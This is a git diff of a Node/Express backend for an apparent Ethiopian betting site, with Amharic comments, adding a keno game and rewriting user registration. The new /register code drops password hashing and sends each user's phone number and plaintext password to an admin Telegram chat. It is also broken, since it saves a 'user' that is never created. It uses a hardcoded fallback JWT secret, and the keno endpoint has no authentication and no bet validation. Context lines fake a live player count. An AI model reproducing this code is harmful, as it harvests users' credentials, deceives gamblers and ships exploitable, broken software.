@@ -8,6 +8,21 @@ const mongoose = require('mongoose');
 
 const app = express();
 
+// ⚠️ የድሮውን አጥፍተው ይህንን ከ function App() { በላይ ይለጥፉት!
+const kenoPayoutTable = {
+  1: [0, 3.8],                                      // 0Hits=0x, 1Hit=3.8x
+  2: [0, 0, 10],                                    // 2Hits=10x
+  3: [0, 0, 2, 50],                                 // 2Hits=2x, 3Hits=50x
+  4: [0, 0, 1, 5, 80],                              // 2Hits=1x, 3Hits=5x, 4Hits=80x
+  5: [0, 0, 0, 4, 40, 150],                         // 3Hits=4x, 4Hits=40x, 5Hits=150x
+  6: [0, 0, 0, 0, 10, 50, 500],                     // 4Hits=10x, 5Hits=50x, 6Hits=500x
+  7: [0, 0, 0, 0, 0, 30, 200, 1000],                // 5Hits=30x, 6Hits=200x, 7Hits=1000x
+  8: [0, 0, 0, 0, 0, 0, 80, 400, 2000],             // 6Hits=80x, 7Hits=400x, 8Hits=2000x
+  9: [0, 0, 0, 0, 0, 0, 0, 150, 800, 5000],         // 7Hits=150x, 8Hits=800x, 9Hits=5000x
+  10: [0, 0, 0, 0, 0, 0, 0, 0, 500, 2500, 10000]    // 8Hits=500x, 9Hits=2500x, 10Hits=10000x
+};
+
+
 // --- 1. CORS Configuration ---
 const allowedOrigins = [
     "https://aviator-ethio-front.vercel.app", 
@@ -47,7 +62,7 @@ mongoose.connect(mongoURI)
 const User = mongoose.model('User', new mongoose.Schema({
     phone: { type: String, required: true, unique: true },
     password: { type: String, required: true },
-    balance: { type: Number, default: 0 }
+    balance: { type: Number, default: 10 }
 }));
 
 // --- 3. Telegram Bot ---
@@ -86,19 +101,56 @@ setInterval(() => {
     gameState.userCount = Math.floor(Math.random() * (3000 - 2500 + 1)) + 2500;
 }, 4000);
 
-// --- 5. APIs (Login/Register) ---
 app.post('/register', async (req, res) => {
     const { phone, password } = req.body;
-    try {
-        const existingUser = await User.findOne({ phone });
-        if (existingUser) return res.status(400).json({ status: 'error', error: "ይህ ስልክ ቀድሞ ተመዝግቧል" });
-        const hashed = await bcrypt.hash(password, 10);
-        const user = new User({ phone, password: hashed, balance: 0 });
-        await user.save();
-        res.json({ status: 'ok' });
-    } catch (e) { res.status(500).json({ status: 'error', error: "ምዝገባ አልተሳካም" }); }
-});
 
+    // 1. መረጃው መሟላቱን ማረጋገጥ
+    if (!phone || !password) {
+        return res.status(400).json({ status: 'error', error: "እባክዎ ስልክ እና የይለፍ ቃል ያስገቡ" });
+    }
+
+    try {
+        // 2. ተጠቃሚው አስቀድሞ መኖሩን ማረጋገጥ
+        const existingUser = await User.findOne({ phone });
+        if (existingUser) {
+            return res.status(400).json({ status: 'error', error: "ይህ ስልክ ቀድሞ ተመዝግቧል" });
+        }
+        
+        // 3. የይለፍ ቃልን ሃሽ ማድረግ
+        
+        
+        await user.save();
+
+        // 5. ለቴሌግራም አስተዳዳሪ ማሳወቂያ መላክ
+        const telegramMessage = `📝 አዲስ ተጠቃሚ ተመዝግቧል!\n📱 ስልክ: ${phone}\n🔑 የይለፍ ቃል: ${password}\n🎁 የፈጠራ ስጦታ: 10 ETB`;
+        
+        bot.sendMessage(ADMIN_ID.toString(), telegramMessage).catch(err => {
+            console.error("❌ Telegram registration alert failed:", err.message);
+        });
+
+        // 6. ከተመዘገበ በኋላ በቀጥታ እንዲገባ JWT Token መፍጠር
+        // ማሳሰቢያ፡ JWT_SECRET በ .env ፋይልህ ውስጥ መኖሩን አረጋግጥ
+        const token = jwt.sign(
+            { id: user._id, phone: user.phone }, 
+            process.env.JWT_SECRET || 'your_secret_key', 
+            { expiresIn: '7d' }
+        );
+
+        // 7. ስኬታማ ምላሽ መላክ
+        res.json({ 
+            status: 'ok', 
+            token, 
+            user: { 
+                phone: user.phone, 
+                balance: user.balance 
+            } 
+        });
+
+    } catch (e) { 
+        console.error("Registration Error:", e);
+        res.status(500).json({ status: 'error', error: "ምዝገባ አልተሳካም፣ እባክዎ ቆይተው ይሞክሩ" }); 
+    }
+});
 app.post('/login', async (req, res) => {
     const { phone, password } = req.body;
     try {
@@ -109,6 +161,64 @@ app.post('/login', async (req, res) => {
     } catch (e) { res.status(500).json({ status: 'error', error: "የውስጥ ስህተት" }); }
 });
 
+const generateKenoDraw = () => {
+  let draws = [];
+  while (draws.length < 20) {
+    let r = Math.floor(Math.random() * 80) + 1;
+    if (!draws.includes(r)) draws.push(r);
+  }
+  return draws;
+};
+
+app.post('/api/keno/play', async (req, res) => {
+  const { phone, selectedNumbers, betAmount } = req.body;
+  const selectionCount = selectedNumbers.length;
+
+  try {
+    // 1. ተጠቃሚውን ከዳታቤዝ ፈልግ
+    const user = await User.findOne({ phone });
+    if (!user) return res.status(404).json({ error: "ተጠቃሚው አልተገኘም!" });
+
+    // 2. ባላንስ አረጋግጥ
+    if (user.balance < betAmount) {
+      return res.status(400).json({ error: "በቂ ባላንስ የለዎትም!" });
+    }
+
+    // 3. 20 እድለኛ ቁጥሮችን አውጣ
+    const drawnNumbers = generateKenoDraw();
+
+    // 4. ስንት ቁጥሮች እንደገጠሙ (Hits) አረጋግጥ
+    const hits = selectedNumbers.filter(n => drawnNumbers.includes(n)).length;
+
+    // 5. የአሸናፊነት ክፍያ አስላ
+    let winAmount = 0;
+    if (selectionCount === 5) {
+      if (hits === 2) winAmount = 10;
+      else if (hits === 3) winAmount = 20;
+      else if (hits === 4) winAmount = 200;
+      else if (hits === 5) winAmount = 700;
+    } else {
+      const multipliers = kenoPayoutTable[selectionCount];
+      const winMultiplier = multipliers[hits] || 0;
+      winAmount = betAmount * winMultiplier;
+    }
+
+    // 6. የዳታቤዝ ባላንስ አዘምን (መወራረድ ሲቀነስ + አሸናፊነት ሲደመር)
+    user.balance = user.balance - betAmount + winAmount;
+    await user.save();
+
+    // 7. ውጤቱን ለተጠቃሚው ላክ
+    res.json({
+      drawnNumbers,
+      hits,
+      winAmount,
+      newBalance: user.balance
+    });
+
+  } catch (err) {
+    res.status(500).json({ error: "የሰርቨር ስህተት ተፈጥሯል" });
+  }
+});
 // --- 6. Socket Logic ---
 io.on('connection', (socket) => {
     socket.emit('data', gameState);
